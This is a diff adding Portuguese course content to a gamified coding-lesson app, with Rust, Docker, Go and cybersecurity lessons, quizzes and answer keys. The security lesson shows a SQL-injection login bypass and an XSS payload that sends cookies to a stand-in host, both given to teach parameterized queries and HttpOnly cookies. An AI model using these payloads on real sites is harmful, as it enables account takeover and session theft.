@@ -2681,6 +2681,1059 @@ git push -u origin feature/radar-antimateria`,
       }
     ],
   },
+  {
+    id: 'rust',
+    slug: 'rust',
+    name: 'Rust',
+    planetName: 'Cidadela de Ferro',
+    description: 'Concorrência sem medo, alta performance e controle de memória com o revolucionário Borrow Checker.',
+    icon: '🦀',
+    color: '#DEA584',
+    language: 'rust',
+    level: 'Avançado',
+    totalXp: 130,
+    lessons: [
+      {
+        id: 'rust-1',
+        title: '1. O Reinado do Ownership & Borrowing',
+        description: 'Domine a gestão de memória segura sem garbage collector e as regras de empréstimo do Rust.',
+        duration: 16,
+        xpReward: 65,
+        language: 'rust',
+        content: `# 🦀 O Reinado do Ownership & Borrowing na Cidadela de Ferro
+
+Bem-vindo à **Cidadela de Ferro**, cadete! No universo dos sistemas críticos — de motores de foguetes a navegadores de alta performance — vazamentos de memória ou ponteiros soltos causam destruição total.
+
+O **Rust**, eleito a linguagem mais amada pelos desenvolvedores por quase uma década, resolveu o maior dilema da computação: **como ter a velocidade do C++ com 100% de segurança de memória?** A resposta é o **Ownership** (Posse).
+
+---
+
+### 🛡️ As Três Leis Sagradas do Ownership
+
+1. Cada valor em Rust tem um único dono (uma variável).
+2. Só pode haver um único dono por vez.
+3. Quando o dono sai do escopo (\`}\`), o valor é destruído e a memória é liberada automaticamente através da função \`drop\`.
+
+\`\`\`rust
+{
+    let msg = String::from("Sinal de Dobra"); // msg é dona da string
+    // usamos msg aqui...
+} // Aqui o escopo fecha e msg é liberada da memória imediatamente!
+\`\`\`
+
+---
+
+### 🤝 Empréstimos (Borrowing): Referências Imutáveis e Mutáveis
+
+Em vez de transferir a posse definitiva de um dado toda vez que chamamos uma função (o que chamamos de *Move*), nós **emprestamos** o valor usando referências:
+
+- **Referência Imutável (\`&T\`):** Permite leitura sem transferir posse. Você pode ter infinitas referências imutáveis ao mesmo tempo:
+  \`\`\`rust
+  fn calcular_tamanho(texto: &String) -> usize {
+      texto.len()
+  }
+  \`\`\`
+- **Referência Mutável (\`&mut T\`):** Permite alterar o valor emprestado. Regra de ouro: **só pode haver uma única referência mutável por vez** para evitar corridas de dados (*data races*)!
+
+> **💡 Dica Pro:**
+> Por padrão, todas as variáveis em Rust são **imutáveis**. Se você planeja alterar o valor de uma variável ao longo do tempo, declare-a explicitamente com \`let mut valor = 10;\`.
+
+> **⚠️ Armadilha Comum:**
+> Tentar acessar uma variável após ela ter sido movida para outra função gera o erro \`use of moved value\`. Para manter o acesso, passe uma referência usando o \`&\` na frente!`,
+        codeExample: `// Demonstração de Empréstimo Seguro em Rust
+fn main() {
+    let mut blindagem = 100;
+    
+    // Passando referência mutável para reparar o escudo
+    reparar_escudo(&mut blindagem);
+    println!("Nível da blindagem reparada: {}%", blindagem);
+}
+
+fn reparar_escudo(nivel: &mut i32) {
+    *nivel += 25;
+}`,
+        exercises: [
+          {
+            type: 'quiz',
+            question: 'Qual das alternativas descreve corretamente a regra do Borrow Checker do Rust sobre referências concorrentes?',
+            options: [
+              'Você pode ter quantas referências mutáveis quiser ao mesmo tempo sem restrições.',
+              'Você pode ter múltiplas referências imutáveis (&) OU exatamente uma única referência mutável (&mut) por vez, prevenindo corridas de dados.',
+              'Referências em Rust exigem a instalação de um Garbage Collector no servidor.',
+              'Empréstimos de memória são proibidos em funções públicas.'
+            ],
+            correctIndex: 1,
+            explanation: 'Essa regra matemática impede corridas de dados (data races) em tempo de compilação: enquanto alguém altera o dado com &mut, ninguém mais pode ler ou escrever nele simultaneamente.'
+          },
+          {
+            type: 'fillblank',
+            title: 'Assinando o Empréstimo Imutável',
+            instruction: 'Complete a função para receber uma referência de leitura de uma String sem tomar posse definitiva dela.',
+            codeSnippet: `fn inspecionar_modulo(nome: {{simbolo_referencia}}String) {
+    println!("Inspecionando módulo: {}", nome);
+}`,
+            blanks: [
+              {
+                id: 'simbolo_referencia',
+                placeholder: 'símbolo de referência',
+                expectedValues: ['&'],
+                hint: 'Caractere único ("e comercial") que cria uma referência de empréstimo em Rust.'
+              }
+            ],
+            explanation: 'Perfeito! O símbolo & empresta o valor sem tomar posse, permitindo que a variável original continue utilizável após a função.'
+          },
+          {
+            type: 'bughunt',
+            title: 'Mutabilidade Não Declarada',
+            scenario: 'O compilador rustc emitiu o erro "cannot mutate immutable variable `escudos`" na Cidadela de Ferro.',
+            buggyCode: `fn main() {
+    let escudos = 80;
+    escudos = escudos + 20;
+    println!("Escudos: {}", escudos);
+}`,
+            expectedKeywords: ['let mut escudos = 80;'],
+            forbiddenKeywords: ['let escudos = 80;'],
+            hint: 'Variáveis em Rust são imutáveis por padrão. Adicione a palavra-chave mut logo após let.',
+            solutionExplanation: 'Excelente depuração! Com let mut escudos = 80;, a variável ganha autorização para reatribuição.'
+          }
+        ]
+      },
+      {
+        id: 'rust-2',
+        title: '2. Robustez Sem Null: Option, Result & Pattern Matching',
+        description: 'Elimine exceções não tratadas com os enums Option e Result e desempacotamento exaustivo com match.',
+        duration: 17,
+        xpReward: 65,
+        language: 'rust',
+        content: `# 🛡️ Robustez Sem Null: Option, Result & Pattern Matching
+
+Sir Tony Hoare, criador da referência nula em 1965, chamou publicamente a invenção do \`null\` de seu **"erro de um bilhão de dólares"** devido à quantidade incontável de falhas e vulnerabilidades que ela causou na história do software.
+
+O Rust tomou uma decisão radical: **o valor \`null\` simplesmente não existe em Rust**!
+
+---
+
+### 📦 O Enum \`Option<T>\`: Presença ou Ausência
+
+Quando um dado pode ou não existir (por exemplo, buscar um usuário por ID no banco), Rust usa o enum nativo:
+
+\`\`\`rust
+enum Option<T> {
+    Some(T), // Contém o valor existente
+    None,    // Ausência do valor
+}
+\`\`\`
+
+---
+
+### ⚠️ O Enum \`Result<T, E>\`: Sucesso ou Falha
+
+Para operações que podem falhar (leitura de arquivos, rede, conversões numéricas):
+
+\`\`\`rust
+enum Result<T, E> {
+    Ok(T),  // Operação concluída com sucesso
+    Err(E), // Falhou com um erro tipado
+}
+\`\`\`
+
+---
+
+### 🎯 Desempacotamento Exaustivo com \`match\`
+
+O compilador exige que você cubra **todos os cenários possíveis**. É impossível esquecer de tratar um erro:
+
+\`\`\`rust
+fn disparar_sensor(status: Option<i32>) {
+    match status {
+        Some(potencia) => println!("Sensor calibrado em {}%", potencia),
+        None => println!("Sensor desconectado!"),
+    }
+}
+\`\`\`
+
+> **💡 Dica Pro:**
+> Quando quiser apenas propagar um erro para quem chamou a função de forma enxuta, use o operador de interrogação \`?\`: \`let arquivo = File::open("log.txt")?;\`.
+
+> **⚠️ Armadilha Comum:**
+> Usar o método \`.unwrap()\` sem cuidado força a extração do valor e trava o programa com um *panic* se o resultado for \`None\` ou \`Err\`. Em produção, prefira sempre \`match\` ou \`if let\`.`,
+        codeExample: `// Leitura e Tratamento Exaustivo em Rust
+fn ler_frequencia(canal: i32) -> Result<f64, String> {
+    if canal > 0 && canal <= 100 {
+        Ok(1420.405) // Frequência do hidrogênio interestelar
+    } else {
+        Err(String::from("Canal fora do espectro detectável."))
+    }
+}
+
+fn main() {
+    match ler_frequencia(42) {
+        Ok(freq) => println!("Frequência captada: {} MHz", freq),
+        Err(erro) => println!("Falha de sintonia: {}", erro),
+    }
+}`,
+        exercises: [
+          {
+            type: 'quiz',
+            question: 'Qual é o enum padrão da linguagem Rust utilizado para representar operações que podem ser bem-sucedidas (Ok) ou falhar com um erro (Err)?',
+            options: [
+              'TryCatch<T>',
+              'Result<T, E>',
+              'Nullable<T>',
+              'ExceptionBlock<E>'
+            ],
+            correctIndex: 1,
+            explanation: 'Result<T, E> é o enum soberano de tratamento de erros em Rust, encapsulando Ok(valor) ou Err(erro) sem necessidade de exceções em tempo de execução.'
+          },
+          {
+            type: 'code',
+            instruction: 'Escreva uma estrutura match para a variável opcao (do tipo Option<i32>) que retorne o valor val no braço Some(val) e 0 no braço None.',
+            initialCode: `// Considere que a variável "opcao" já existe
+// Complete o match abaixo
+match opcao {\n`,
+            expectedKeywords: ['match opcao', 'Some(val) => val', 'None => 0'],
+            hint: 'Escreva: match opcao { Some(val) => val, None => 0 }.',
+            solution: `match opcao {
+    Some(val) => val,
+    None => 0,
+}`
+          }
+        ]
+      }
+    ]
+  },
+  {
+    id: 'docker',
+    slug: 'docker',
+    name: 'Docker',
+    planetName: 'Estação Orbital Docker',
+    description: 'Empacote aplicações em cápsulas autônomas, imutáveis e portáteis. O fim do "na minha máquina funciona!".',
+    icon: '🐳',
+    color: '#2496ED',
+    language: 'dockerfile',
+    level: 'Intermediário',
+    totalXp: 130,
+    lessons: [
+      {
+        id: 'docker-1',
+        title: '1. O Fim do "Na Minha Máquina Funciona": Imagens & Containers',
+        description: 'Entenda a revolução dos containers, a diferença para máquinas virtuais e comandos fundamentais.',
+        duration: 15,
+        xpReward: 65,
+        language: 'bash',
+        content: `# 🐳 Imagens & Containers na Estação Orbital Docker
+
+Quantas vezes você já ouviu a frase clássica: *"Ué, mas na minha máquina funciona!"*?
+
+Diferenças de versão de Node, bibliotecas do sistema operacional e configurações de ambiente sempre foram pesadelos para equipes de software. O **Docker** resolveu isso criando **containers**: cápsulas isoladas e portáteis que rodam com o mesmo comportamento exato em qualquer lugar.
+
+---
+
+### 📦 Container vs Máquina Virtual (VM)
+
+- **Máquinas Virtuais:** Cada VM precisa de um sistema operacional convidado (*Guest OS*) completo de vários gigabytes e inicialização lenta.
+- **Containers Docker:** Compartilham o mesmo Kernel do sistema hospedeiro, isolando apenas os processos. Por isso iniciam em **milissegundos** e gastam pouquíssima memória RAM!
+
+---
+
+### 🖼️ Imagem vs Container
+
+- **Imagem:** É a receita estática e imutável (como a planta de uma nave espacial).
+- **Container:** É a instância viva em execução criada a partir da imagem (a nave voando no espaço).
+
+---
+
+### 🚀 Comandos Essenciais do Terminal
+
+\`\`\`bash
+# 1. Baixar e executar um container em segundo plano com portas mapeadas
+docker run -d -p 8080:80 --name servidor-web nginx
+
+# 2. Listar containers que estão rodando no momento
+docker ps
+
+# 3. Parar um container em execução
+docker stop servidor-web
+
+# 4. Ver os logs gerados pela aplicação dentro do container
+docker logs servidor-web
+\`\`\`
+
+> **💡 Dica Pro:**
+> A flag \`-p 8080:80\` mapeia a **porta 8080 da sua máquina real (Host)** para a **porta 80 interna do container**. Se você esquecer essa flag, a aplicação roda, mas você não consegue acessá-la no navegador!
+
+> **⚠️ Armadilha Comum:**
+> Esquecer a flag \`-d\` (*detached mode*) faz o container rodar preso ao seu terminal atual, bloqueando o prompt.`,
+        codeExample: `# Subindo um Banco de Dados PostgreSQL no Docker em 5 segundos
+docker run -d \\
+  --name postgres-nexus \\
+  -e POSTGRES_PASSWORD=segredo \\
+  -p 5432:5432 \\
+  postgres:15-alpine`,
+        exercises: [
+          {
+            type: 'quiz',
+            question: 'O que faz o parâmetro "-p 3000:80" no comando "docker run -p 3000:80 meu-app"?',
+            options: [
+              'Limita o uso de memória do container para 3000 megabytes.',
+              'Mapeia a porta 3000 do computador host para a porta 80 interna do container.',
+              'Executa 3000 cópias simultâneas da aplicação.',
+              'Define a senha de administrador do container como 3000.'
+            ],
+            correctIndex: 1,
+            explanation: 'A sintaxe de portas no Docker é sempre -p PORTA_DO_HOST:PORTA_INTERNA_DO_CONTAINER, redirecionando o tráfego de rede entre a máquina física e a aplicação encapsulada.'
+          },
+          {
+            type: 'fillblank',
+            title: 'Executando o Servidor Desacoplado',
+            instruction: 'Complete o comando docker para rodar o container em segundo plano (detached mode) e mapear a porta 80.',
+            codeSnippet: `docker run -{{flag_background}} -p 80:80 --name servidor_nexus nginx`,
+            blanks: [
+              {
+                id: 'flag_background',
+                placeholder: 'flag de segundo plano',
+                expectedValues: ['d'],
+                hint: 'Letra única que ativa o Detached Mode (segundo plano).'
+              }
+            ],
+            explanation: 'Perfeito! A flag -d libera seu terminal imediatamente enquanto o container segue operando em background.'
+          }
+        ]
+      },
+      {
+        id: 'docker-2',
+        title: '2. A Receita Espacial: Construindo Dockerfiles',
+        description: 'Crie suas próprias imagens Docker profissionais com cache de camadas e boas práticas de build.',
+        duration: 16,
+        xpReward: 65,
+        language: 'dockerfile',
+        content: `# 📜 Construindo Dockerfiles Profissionais
+
+Para empacotar a sua própria aplicação dentro de uma imagem Docker, você escreve um arquivo de instruções chamado **\`Dockerfile\`**.
+
+---
+
+### 🧱 Anatomia de um Dockerfile para Node.js
+
+\`\`\`dockerfile
+# 1. Imagem base oficial do Node.js leve (versão alpine)
+FROM node:18-alpine
+
+# 2. Diretório de trabalho dentro do container
+WORKDIR /app
+
+# 3. Copiar manifestos de dependências primeiro (otimização de cache!)
+COPY package*.json ./
+
+# 4. Instalar dependências
+RUN npm install --production
+
+# 5. Copiar o restante do código fonte
+COPY . .
+
+# 6. Informar qual porta o container escuta
+EXPOSE 3000
+
+# 7. Comando padrão para ligar o servidor
+CMD ["node", "server.js"]
+\`\`\`
+
+---
+
+### ⚡ O Segredo do Cache de Camadas (*Layer Caching*)
+
+Cada instrução (\`RUN\`, \`COPY\`, \`WORKDIR\`) cria uma camada imutável no Docker.
+- Se o seu código mudar, mas suas dependências continuarem iguais, o Docker reutiliza o cache do \`npm install\`!
+- Por isso, copiamos o \`package.json\` antes de copiar todo o código (\`COPY . .\`). Isso reduz o tempo de deploy de minutos para segundos!
+
+> **💡 Dica Pro:**
+> Crie sempre um arquivo \`.dockerignore\` excluindo a pasta \`node_modules\` e arquivos \`.env\`. Isso impede que pastas pesadas locais poluam o build da imagem.
+
+> **⚠️ Armadilha Comum:**
+> Confundir \`RUN\` com \`CMD\`. O \`RUN\` é executado **durante a construção da imagem** (ex: instalar pacotes). O \`CMD\` é executado **quando o container é ligado**!`,
+        codeExample: `# Dockerfile Otimizado para Produção
+FROM node:20-alpine
+WORKDIR /usr/src/app
+COPY package*.json ./
+RUN npm ci --only=production
+COPY . .
+EXPOSE 8080
+CMD ["npm", "start"]`,
+        exercises: [
+          {
+            type: 'quiz',
+            question: 'Qual instrução do Dockerfile é responsável por definir qual imagem de partida oficial será utilizada como base do container?',
+            options: [
+              'ORIGIN',
+              'FROM',
+              'BASE_IMAGE',
+              'IMPORT'
+            ],
+            correctIndex: 1,
+            explanation: 'Todo Dockerfile começa com a instrução FROM especificando a imagem base (ex: FROM node:18-alpine ou FROM python:3.11-slim).'
+          },
+          {
+            type: 'code',
+            instruction: 'Escreva um Dockerfile básico iniciando com a imagem base node:18-alpine, definindo o diretório de trabalho /app e o comando de inicialização CMD ["node", "app.js"].',
+            initialCode: `# Escreva as instruções do Dockerfile abaixo\n`,
+            expectedKeywords: ['FROM node:18-alpine', 'WORKDIR /app', 'CMD ["node", "app.js"]'],
+            hint: 'Escreva: FROM node:18-alpine, depois WORKDIR /app e finalize com CMD ["node", "app.js"].',
+            solution: `FROM node:18-alpine
+WORKDIR /app
+CMD ["node", "app.js"]`
+          }
+        ]
+      }
+    ]
+  },
+  {
+    id: 'ciberseguranca',
+    slug: 'ciberseguranca',
+    name: 'Cibersegurança',
+    planetName: 'Shadow Grid',
+    description: 'Aprenda as técnicas dos hackers éticos: blindagem contra invasões, OWASP Top 10 e proteção de dados.',
+    icon: '🛡️',
+    color: '#00E5FF',
+    language: 'javascript',
+    level: 'Intermediário',
+    totalXp: 130,
+    lessons: [
+      {
+        id: 'sec-1',
+        title: '1. O Vetor de Invasão: SQL Injection & Sanitização',
+        description: 'Descubra como ataques de injeção funcionam e como blindar sistemas com Prepared Statements.',
+        duration: 16,
+        xpReward: 65,
+        language: 'sql',
+        content: `# 🛡️ SQL Injection & Sanitização na Shadow Grid
+
+Bem-vindo à **Shadow Grid**, a divisão de defesa cibernética e operações de segurança ética do Nexus!
+
+Dentre todas as ameaças catalogadas pela fundação **OWASP** (*Open Web Application Security Project*), o **SQL Injection** foi a vulnerabilidade que causou os maiores vazamentos de bancos de dados da história da internet.
+
+---
+
+### 💣 A Anatomia do Ataque
+
+Imagine um backend ingênuo que monta a consulta SQL concatenando diretamente o que o usuário digita no campo de login:
+
+\`\`\`javascript
+// ❌ CÓDIGO VULNERÁVEL:
+const query = "SELECT * FROM usuarios WHERE email = '" + emailDigitado + "'";
+\`\`\`
+
+Se um atacante digitar no campo de e-mail o seguinte payload:
+\`\`\`text
+' OR '1'='1
+\`\`\`
+
+A consulta final executada no banco de dados se transforma em:
+\`\`\`sql
+SELECT * FROM usuarios WHERE email = '' OR '1'='1'
+\`\`\`
+Como \`'1'='1'\` é sempre verdadeiro, o banco devolve **todos os usuários da aplicação**, garantindo acesso irrestrito ao invasor sem senha!
+
+---
+
+### 🛡️ O Antídoto: Prepared Statements (Consultas Parametrizadas)
+
+A regra de ouro da cibersegurança: **nunca confie na entrada do usuário**.
+
+Com **Prepared Statements**, o banco de dados compila o comando SQL primeiro, e os dados do usuário são enviados separadamente como parâmetros puros. O texto digitado jamais será interpretado como instrução SQL:
+
+\`\`\`javascript
+// ✅ CÓDIGO BLINDADO COM PARÂMETROS ($1, $2 ou ?):
+const query = "SELECT * FROM usuarios WHERE email = $1 AND senha_hash = $2";
+await db.query(query, [emailDigitado, hashCalculado]);
+\`\`\`
+
+> **💡 Dica Pro:**
+> ORMs e bibliotecas modernas (como Prisma, Supabase, Drizzle, Hibernate) já utilizam Prepared Statements nativamente por baixo dos panos, protegendo você por padrão.
+
+> **⚠️ Armadilha Comum:**
+> Fazer validação de segurança apenas no frontend (formulário HTML ou React) não protege nada! O atacante pode enviar requisições diretas via terminal usando \`curl\` ignorando completamente suas travas visuais.`,
+        codeExample: `// Autenticação Segura Contra Injeção SQL
+import { pool } from './database';
+
+async function autenticarCadete(email, senhaHash) {
+  // O parâmetro $1 isola os dados de qualquer tentativa de injeção
+  const resultado = await pool.query(
+    'SELECT id, username, role FROM users WHERE email = $1 AND password_hash = $2',
+    [email, senhaHash]
+  );
+  return resultado.rows[0] || null;
+}`,
+        exercises: [
+          {
+            type: 'quiz',
+            question: 'Por que o uso de Consultas Parametrizadas (Prepared Statements) impede com eficácia ataques de SQL Injection?',
+            options: [
+              'Porque criptografa o banco de dados com uma chave militar de 512 bits.',
+              'Porque separa o código SQL estrutural dos dados de entrada, garantindo que o texto do usuário seja tratado estritamente como dado literal e nunca como comando executável.',
+              'Porque impede que o usuário digite caracteres especiais no teclado.',
+              'Porque fecha as portas de rede do servidor enquanto a busca é realizada.'
+            ],
+            correctIndex: 1,
+            explanation: 'Nas Prepared Statements, o motor do banco de dados compila o plano de execução antes de receber os valores, impossibilitando que comandos maliciosos injetados alterem a lógica da consulta.'
+          },
+          {
+            type: 'bughunt',
+            title: 'Injeção SQL Crítica no Login',
+            scenario: 'A auditoria de segurança da Shadow Grid detectou uma falha grave: o desenvolvedor concatenou a variável de e-mail com o operador + na string de busca.',
+            buggyCode: `function buscarUsuario(email) {
+  const query = "SELECT * FROM users WHERE email = '" + email + "'";
+  return db.execute(query);
+}`,
+            expectedKeywords: ['db.execute("SELECT * FROM users WHERE email = $1", [email]);'],
+            forbiddenKeywords: ['WHERE email = \'\" + email + \"\''],
+            hint: 'Substitua a concatenação direta por uma consulta parametrizada usando $1 como placeholder e passe [email] no array de parâmetros.',
+            solutionExplanation: 'Vulnerabilidade erradicada! Ao parametrizar a busca com $1, qualquer payload malicioso digitado será tratado apenas como texto inofensivo.'
+          }
+        ]
+      },
+      {
+        id: 'sec-2',
+        title: '2. Blindagem de Aplicações: XSS & Hashing de Senhas',
+        description: 'Impeça a injeção de scripts no navegador e proteja credenciais com algoritmos de hash como bcrypt.',
+        duration: 17,
+        xpReward: 65,
+        language: 'javascript',
+        content: `# 🔒 XSS & Criptografia de Credenciais
+
+Após proteger a camada de banco de dados, devemos blindar a interface e o cofre de credenciais contra as duas técnicas mais comuns de roubo de sessão: **XSS** e **senhas vazadas**.
+
+---
+
+### 🕷️ O que é XSS (Cross-Site Scripting)?
+
+Ocorre quando dados fornecidos por usuários são renderizados na tela sem sanitização, permitindo a execução de JavaScript malicioso no navegador de outras pessoas:
+
+\`\`\`html
+<!-- Se o perfil do invasor for este payload: -->
+<script>fetch('https://hacker.io/steal?cookie=' + document.cookie)</script>
+\`\`\`
+
+Se o site injetar esse texto usando \`innerHTML\` ou \`dangerouslySetInnerHTML\`, o script roda silenciosamente e envia os cookies da vítima direto para o servidor do hacker!
+
+**Como prevenir:**
+1. Sempre use \`textContent\` em vez de \`innerHTML\` no JavaScript nativo.
+2. Armazene tokens de autenticação em cookies com a flag **\`HttpOnly\`** (que impede que qualquer código JavaScript leia o cookie).
+
+---
+
+### 🔑 Nunca Salve Senhas em Texto Puro!
+
+Se o banco de dados for comprometido, senhas em texto puro expõem todos os usuários imediatamente. Também nunca use MD5 ou SHA256 puro (são rápidos demais e vulneráveis a tabelas de busca *Rainbow Tables*).
+
+A indústria exige **algoritmos com Salt e fator de custo** como **bcrypt** ou **Argon2**:
+
+\`\`\`javascript
+import bcrypt from 'bcrypt';
+
+// 1. Gerando o hash seguro com 12 rodadas de salt
+const senhaDigitada = "senha_secreta_123";
+const hashSeguro = await bcrypt.hash(senhaDigitada, 12);
+
+// 2. Comparando a senha informada no login com o hash do banco
+const senhaValida = await bcrypt.compare(senhaDigitada, hashSeguro);
+\`\`\`
+
+> **💡 Dica Pro:**
+> O *Salt* é uma sequência aleatória única adicionada à senha antes do hash. Ele garante que dois usuários com a mesma senha tenham hashes completamente diferentes no banco!
+
+> **⚠️ Armadilha Comum:**
+> Tratar criptografia reversível e hashing como a mesma coisa. Criptografia pode ser decodificada de volta; um Hash seguro é uma via de mão única matemática que nunca pode ser revertida.`,
+        codeExample: `// Exemplo de Hash de Senha com Bcrypt
+import bcrypt from 'bcrypt';
+
+export async function registrarCadeteSeguro(email, senhaPlana) {
+  const SALT_ROUNDS = 12;
+  const hash = await bcrypt.hash(senhaPlana, SALT_ROUNDS);
+  
+  // Gravamos apenas o hash no banco, NUNCA a senha pura!
+  return await salvarNoBanco({ email, senha_hash: hash });
+}`,
+        exercises: [
+          {
+            type: 'quiz',
+            question: 'Qual configuração de cookie do navegador é a mais eficaz para impedir que ataques do tipo Cross-Site Scripting (XSS) consigam roubar o token de sessão do usuário?',
+            options: [
+              'Definir a cor do cookie como verde.',
+              'Ativar a flag HttpOnly, tornando o cookie inacessível para leitura via scripts JavaScript (document.cookie).',
+              'Reduzir o tamanho do cookie para menos de 10 bytes.',
+              'Salvar o cookie na pasta de downloads do usuário.'
+            ],
+            correctIndex: 1,
+            explanation: 'A flag HttpOnly instrui o navegador a anexar o cookie nas requisições HTTP, mas bloqueia terminantemente qualquer acesso a ele via document.cookie pelo JavaScript da página.'
+          },
+          {
+            type: 'fillblank',
+            title: 'Verificando a Senha Criptografada',
+            instruction: 'Preencha o método da biblioteca bcrypt utilizado para verificar se a senha digitada confere com o hash salvo.',
+            codeSnippet: `const ehValida = await bcrypt.{{metodo_comparacao}}(senhaDigitada, hashSalvo);`,
+            blanks: [
+              {
+                id: 'metodo_comparacao',
+                placeholder: 'método de comparação',
+                expectedValues: ['compare'],
+                hint: 'Palavra em inglês que significa "comparar".'
+              }
+            ],
+            explanation: 'Perfeito! bcrypt.compare() desfaz o salt e compara a senha em tempo constante, prevenindo inclusive ataques de temporização (Timing Attacks).'
+          }
+        ]
+      }
+    ]
+  },
+  {
+    id: 'golang',
+    slug: 'golang',
+    name: 'Go',
+    planetName: 'Núcleo Supersônico',
+    description: 'A linguagem criada no Google para microsserviços ultrarrápidos, concorrência nativa e alta escala.',
+    icon: '🐹',
+    color: '#00ADD8',
+    language: 'go',
+    level: 'Intermediário',
+    totalXp: 130,
+    lessons: [
+      {
+        id: 'go-1',
+        title: '1. Simplicidade Supersônica: Tipos & Funções em Go',
+        description: 'Conheça o design enxuto do Go, declaração rápida := e o padrão explícito de retorno de erros.',
+        duration: 15,
+        xpReward: 65,
+        language: 'go',
+        content: `# 🐹 Simplicidade Supersônica no Núcleo Go
+
+Bem-vindo ao **Núcleo Supersônico**, cadete! Quando os pioneiros da computação Ken Thompson e Rob Pike projetaram a linguagem **Go** (Golang) dentro do Google em 2009, o objetivo era claro: **eliminar o inchaço e a lentidão dos sistemas de grande escala**.
+
+Go é a linguagem que move as maiores ferramentas de infraestrutura do mundo moderno: **Docker, Kubernetes, Terraform e Prometheus** são todos escritos em Go!
+
+---
+
+### ⚡ Características Marcantes do Go
+
+1. **Compilação Relâmpago:** Compila diretamente para um binário executável nativo único sem runtimes externos pesados.
+2. **Sintaxe Limpa & Enxuta:** Não há classes, herança complexa nem exceções escondidas.
+3. **Declaração Curta com Inferência (\`:=\`):**
+   \`\`\`go
+   nomeNave := "Gopher-1" // Go já sabe que é do tipo string!
+   velocidadeDobra := 9.9
+   \`\`\`
+
+---
+
+### 🔀 Múltiplos Retornos & Tratamento Explícito de Erros
+
+Em Go, funções podem retornar múltiplos valores simultaneamente. Por convenção universal, o último valor retornado é o erro:
+
+\`\`\`go
+func carregarSensor(id int) (string, error) {
+    if id <= 0 {
+        return "", errors.New("identificador de sensor inválido")
+    }
+    return "SENSOR_ONLINE", nil
+}
+\`\`\`
+
+Para tratar a chamada:
+\`\`\`go
+status, err := carregarSensor(10)
+if err != nil {
+    log.Fatal("Falha crítica:", err)
+}
+fmt.Println("Sensor pronto:", status)
+\`\`\`
+
+> **💡 Dica Pro:**
+> O compilador do Go é inflexível por design: se você importar um pacote ou declarar uma variável e não utilizá-la no código, o Go recusa-se a compilar! Isso mantém o código de produção impecavelmente limpo.
+
+> **⚠️ Armadilha Comum:**
+> Tentar usar o operador \`:=\` fora do corpo de uma função. No escopo global do pacote, deve-se usar a palavra-chave \`var\`.`,
+        codeExample: `// Programa Canônico em Go
+package main
+
+import (
+    "fmt"
+    "errors"
+)
+
+func dividirEnergia(total int, divisores int) (int, error) {
+    if divisores == 0 {
+        return 0, errors.New("divisão por zero impossível no reator")
+    }
+    return total / divisores, nil
+}
+
+func main() {
+    resultado, err := dividirEnergia(100, 4)
+    if err != nil {
+        fmt.Println("Erro:", err)
+        return
+    }
+    fmt.Printf("Energia por propulsor: %d MW\\n", resultado)
+}`,
+        exercises: [
+          {
+            type: 'quiz',
+            question: 'Qual é o padrão oficial e idiomático da linguagem Go para lidar com falhas e erros em funções?',
+            options: [
+              'Lançar exceções com a palavra-chave throw e capturar com blocos try/catch.',
+              'Retornar o erro explicitamente como o último valor do retorno da função e checá-lo com "if err != nil".',
+              'O compilador Go proíbe qualquer tipo de erro de acontecer.',
+              'Escrever todos os erros em um arquivo .log oculto sem avisar o chamador.'
+            ],
+            correctIndex: 1,
+            explanation: 'Go não utiliza try/catch. Em vez disso, funções retornam (valor, error) e o desenvolvedor verifica explicitamente if err != nil, garantindo que nenhum erro passe despercebido.'
+          },
+          {
+            type: 'fillblank',
+            title: 'Declarando Variáveis com Inferência Rápida',
+            instruction: 'Preencha o operador de declaração curta de variáveis idiomático do Go.',
+            codeSnippet: `piloto {{operador_curto}} "Comandante Lynx"`,
+            blanks: [
+              {
+                id: 'operador_curto',
+                placeholder: 'operador curto',
+                expectedValues: [':='],
+                hint: 'Combinação de dois pontos e igual usada para declarar e inferir tipo em Go.'
+              }
+            ],
+            explanation: 'Perfeito! O operador := declara a variável e infere o tipo string automaticamente em tempo de compilação.'
+          }
+        ]
+      },
+      {
+        id: 'go-2',
+        title: '2. Concorrência Hiperespacial: Goroutines & Channels',
+        description: 'Execute milhões de tarefas simultâneas com goroutines leves e canais de comunicação seguros.',
+        duration: 17,
+        xpReward: 65,
+        language: 'go',
+        content: `# 🚀 Goroutines & Channels: Concorrência Hiperespacial
+
+Enquanto a maioria das linguagens briga com threads pesadas do sistema operacional (onde criar mil threads esgota a memória do servidor), Go foi projetado desde o primeiro dia para **concorrência massiva**.
+
+---
+
+### 💨 O que é uma Goroutine?
+
+Uma **Goroutine** é uma thread gerenciada pelo próprio runtime do Go, e não pelo sistema operacional.
+- Uma thread tradicional consome cerca de **1 MB** de memória.
+- Uma Goroutine consome apenas **2 KB**! Você pode rodar **centenas de milhares** de Goroutines simultâneas no mesmo servidor sem engasgar.
+
+Para transformar qualquer função em uma tarefa concorrente:
+\`\`\`go
+go dispararPropulsor("Motor Alpha") // Executa em paralelo instantaneamente!
+\`\`\`
+
+---
+
+### 📬 Channels: Comunicação Sem Conflitos
+
+O lema sagrado do Go é:  
+> *"Não se comunique compartilhando memória; compartilhe memória se comunicando."*
+
+Para transferir dados com segurança entre diferentes Goroutines sem precisar de travas complexas (*mutex*), usamos **Channels** (Canais):
+
+\`\`\`go
+// 1. Criar um canal de strings
+mensagens := make(chan string)
+
+// 2. Enviar dado para o canal dentro de uma goroutine
+go func() {
+    mensagens <- "Sinal de Dobra Recebido!" // Operador <- empurra o dado
+}()
+
+// 3. Receber o dado no processo principal
+resultado := <-mensagens // Operador <- extrai o dado
+fmt.Println(resultado)
+\`\`\`
+
+> **💡 Dica Pro:**
+> O envio e o recebimento em canais não-bufferizados bloqueiam a execução até que o outro lado esteja pronto. Isso cria uma sincronização perfeita automática entre tarefas assíncronas!
+
+> **⚠️ Armadilha Comum:**
+> Tentar ler de um canal onde nenhuma Goroutine está mais escrevendo nem o canal foi fechado gera um erro fatal em tempo de execução: \`fatal error: all goroutines are asleep - deadlock!\`.`,
+        codeExample: `// Processando Telemetria Concorrente em Go
+package main
+
+import "fmt"
+
+func escanearSetor(setor int, canal chan string) {
+    canal <- fmt.Sprintf("Setor %d mapeado com sucesso!", setor)
+}
+
+func main() {
+    telemetria := make(chan string)
+
+    // Dispara 3 escaneamentos em paralelo
+    go escanearSetor(1, telemetria)
+    go escanearSetor(2, telemetria)
+    go escanearSetor(3, telemetria)
+
+    // Coleta as 3 respostas
+    for i := 0; i < 3; i++ {
+        fmt.Println(<-telemetria)
+    }
+}`,
+        exercises: [
+          {
+            type: 'quiz',
